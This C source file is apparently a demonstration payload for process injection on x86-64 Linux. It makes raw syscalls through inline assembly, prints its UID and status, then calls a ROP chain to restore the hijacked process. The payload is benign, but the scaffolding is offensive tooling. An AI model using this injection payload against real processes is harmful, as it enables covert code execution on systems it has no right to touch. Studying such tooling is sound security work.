#include <unistd.h>
#include <sys/syscall.h>
#include <sys/user.h>
#include <time.h>
#include <stdint.h>
#include <elf.h>
#include "param_struct_x64.h"
#include "reimplement.h"
#include "cleanup.h"


static long syscall_api(long n, long a0, long a1, long a2) {
    register long rax asm("rax") = n;
    register long rdi asm("rdi") = a0;
    register long rsi asm("rsi") = a1;
    register long rdx asm("rdx") = a2;
    asm volatile("syscall"
        : "+r"(rax)
        : "r"(rdi), "r"(rsi), "r"(rdx)
        : "rcx", "r11", "memory");
    return rax;
}

static void print(const char *msg) {
    int len = 0;
    while (msg[len]) len++;
    syscall_api(SYS_write, 2, (long)msg, len);
}

static void print_int(int n) {
    char buf[12];
    int i = 10;
    buf[11] = '\0';
    if (n == 0) { syscall_api(SYS_write, 1, (long)"0", 1); return; }
    while (n > 0 && i >= 0) {
        buf[i--] = '0' + (n % 10);
        n /= 10;
    }
    syscall_api(SYS_write, 2, (long)&buf[i+1], 10 - i);
}

static void sleep_s(int seconds) {
    struct timespec ts = {seconds, 0};
    syscall_api(SYS_nanosleep, (long)&ts, 0, 0);
}

int go(struct cleanup *params) {
    int uid = syscall_api(SYS_getuid, 0, 0, 0);
    print("[+] Payload running with UID: ");
    print_int((uint64_t)uid);
    print("\n");
    for (int i = 0; i < 5; i++) {
        if (i != 2) {
            print("[+] Payload is running...\n");
        } else {
            print("[+] Payload quitting -- restoring process\n");
            rop_chain(params);
            break;
        }
        sleep_s(5);
    }

    while(1);

    return 0;
}

__asm__(
    ".global _start\n"
    ".type _start, %function\n"
    "_start:\n"
    "nop\n"
    "nop\n"
    "call go\n"
    "int3\n"
);